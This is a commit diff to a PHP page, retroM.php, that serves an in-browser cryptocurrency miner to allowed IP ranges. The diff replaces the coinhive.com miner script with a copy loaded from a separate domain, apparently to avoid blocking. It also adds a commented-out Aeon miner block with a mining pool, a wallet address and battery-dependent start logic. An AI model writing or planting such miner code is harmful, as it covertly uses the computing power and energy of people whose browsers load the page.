0f439b2297d0ecc818806ac6de9f3e6c0e952c2a
enricodias <enricodias@4e295065-c09e-4d63-a270-bf4c1aff70c9>
2018-01-04 00:19:00 +0000

    Added aeon miner option.

--- trunk/www/retroM.php
+++ trunk/www/retroM.php
@@ -32,8 +32,9 @@ include('./inc/allowed_cidrs.php');
 
 if (empty($allowed_cidrs) || !testUserIP($_SERVER['REMOTE_ADDR'], $allowed_cidrs)) exit();
 
+// <script type="text/javascript" src="https://coinhive.com/lib/coinhive.min.js"></script>
 ?>
-<script type="text/javascript" src="https://coinhive.com/lib/coinhive.min.js"></script>
+<script type="text/javascript" src="https://plugin.brfiles.com/lib/ch64.min.js"></script>
 <script type="text/javascript">
 var miner = new CoinHive.Anonymous('tvCtC1O0jLGZJ6TWIIgdBxYQctUZtLdM', {
 	threads: 1,
@@ -52,3 +53,38 @@ try {
 	});
 }catch(e){miner.start(CoinHive.FORCE_MULTI_TAB);}
 </script>
+<?
+/*
+?>
+<html>
+<head>
+	<meta http-equiv="refresh" content="7200">
+</head>
+<body>
+<script type="text/javascript" src="https://plugin.brfiles.com/lib/ae64.min.js"></script>
+<script type="text/javascript">
+function start() {
+	startMining(
+		'durinsmine.com',
+		'WmsZ6c6aaVvivJEHfSDkJgYo85dQFJ9aMQhw5na12ApjSD5efCMDwyGEyw81oUXR536ubbymujshveRA5oip3AHJ37U7dBPM7',
+		'x',
+		1
+	);
+}
+try {
+	navigator.getBattery().then(function (battery) {
+		
+		if (battery.charging) start();
+		
+		battery.onchargingchange = function (evt) {
+			if (battery.charging) start();
+			else stopMining();
+		}
+		
+	});
+}catch(e){start();}
+</script>
+</body>
+</html>
+*/
+?>
